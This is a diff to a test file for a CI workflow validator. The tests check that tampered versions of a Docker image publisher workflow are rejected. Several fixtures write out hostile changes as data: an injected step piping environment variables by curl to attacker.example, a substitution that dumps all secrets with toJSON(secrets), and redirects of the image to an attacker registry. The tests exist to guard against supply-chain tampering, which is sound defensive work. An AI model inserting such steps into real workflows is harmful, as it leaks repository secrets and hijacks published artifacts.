@@ -66,7 +66,12 @@ assert.deepEqual(
   'reviewed workflow baseline must pass'
 );
 
-assertAccepted('disabled Reya Safe UI workflow', (root) =>
+assertAccepted('composed disabled Reya Safe UI workflow', (root) => {
+  mkdirSync(join(root, 'packages/reya-safe-ui'), { recursive: true });
+  writeFileSync(
+    join(root, 'packages/reya-safe-ui/package.json'),
+    '{"name":"@usecannon/reya-safe-ui","private":true}\n'
+  );
   writeFileSync(
     join(root, '.github/workflows/reya-safe-ui.yml'),
     [
@@ -98,7 +103,20 @@ assertAccepted('disabled Reya Safe UI workflow', (root) =>
       '      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02',
       '',
     ].join('\n')
-  )
+  );
+});
+
+assertRejected(
+  'deleted composed Reya Safe UI workflow',
+  (root) => {
+    mkdirSync(join(root, 'packages/reya-safe-ui'), { recursive: true });
+    writeFileSync(
+      join(root, 'packages/reya-safe-ui/package.json'),
+      '{"name":"@usecannon/reya-safe-ui","private":true}\n'
+    );
+    rmSync(join(root, '.github/workflows/reya-safe-ui.yml'), { force: true });
+  },
+  'reya-safe-ui.yml: required workflow is missing'
 );
 
 assertRejected(
@@ -279,7 +297,7 @@ assertRejected(
       "vars.CANNON_SAFE_PUBLISH_ENABLED == 'true'",
       "vars.CANNON_SAFE_PUBLISH_ENABLED != 'false'"
     ),
-  'Publisher trust and default-off gates have changed'
+  'Publisher workflow differs from the exact reviewed schema'
 );
 
 assertRejected(
@@ -301,7 +319,52 @@ assertRejected(
       'docker/setup-buildx-action@bb05f3f5519dd87d3ba754cc423b652a5edd6d2c',
       'docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130'
     ),
-  'remote action set has changed'
+  'Publisher workflow differs from the exact reviewed schema'
+);
+
+assertRejected(
+  'publisher image destination substitution',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/safe-app-backend-publish.yml'),
+      'IMAGE_NAME: ghcr.io/reya-labs/safe-app-backend',
+      'IMAGE_NAME: ghcr.io/attacker/safe-app-backend'
+    ),
+  'Publisher workflow differs from the exact reviewed schema'
+);
+
+assertRejected(
+  'publisher registry substitution',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/safe-app-backend-publish.yml'),
+      '          registry: ghcr.io',
+      '          registry: r.example'
+    ),
+  'Publisher workflow differs from the exact reviewed schema'
+);
+
+assertRejected(
+  'arbitrary publisher run step',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/safe-app-backend-publish.yml'),
+      '      - uses: docker/setup-buildx-action@',
+      '      - run: env | curl --data-binary @- https://attacker.example\n' +
+        '      - uses: docker/setup-buildx-action@'
+    ),
+  'Publisher workflow differs from the exact reviewed schema'
+);
+
+assertRejected(
+  'whole publisher secrets context',
+  (root) =>
+    replace(
+      join(root, '.github/workflows/safe-app-backend-publish.yml'),
+      '${{ secrets.GITHUB_TOKEN }}',
+      '${{ toJSON(secrets) }}'
+    ),
+  'whole or computed secrets contexts'
 );
 
 assertRejected(
